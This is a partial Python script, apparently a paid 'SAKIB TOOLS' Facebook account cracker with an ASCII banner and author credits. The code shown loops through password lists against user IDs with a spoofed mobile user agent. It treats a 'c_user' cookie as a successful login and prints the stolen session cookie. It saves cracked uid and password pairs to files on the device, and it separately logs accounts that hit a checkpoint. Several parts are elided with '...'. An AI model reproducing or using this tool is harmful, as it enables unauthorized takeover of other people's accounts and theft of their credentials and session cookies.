...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo = ("""
\033[1;33m .d8888.  .d8b.  db   dD d888888b d8888b.
\033[1;33m 88'  YP d8' `8b 88 ,8P'   `88'   88  `8D
\033[1;32m `8bo.   88ooo88 88,8P      88    88oooY' 
\033[1;32m  `Y8b. 88~~~88 88`8b      88    88~~~b. 
\033[1;36m db   8D 88   88 88 `88.   .88.   88   8D 
\033[1;36m `8888Y' YP   YP YP   YD Y888888P Y8888P' 
                                                 
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SAKIB TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m SAKIB 
\033[1;32m[-] GITHUB    :\033[1;32m SAKIB-VAU
\033[1;32m[-] FACEBOOK  :\033[1;32m AHMED SAKIB
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SAKIB BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSAKIB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SAKIB-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/SAKIB/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SAKIB-CP❌] {uid}|{ps}")
                open('/sdcard/SAKIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SAKIB-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
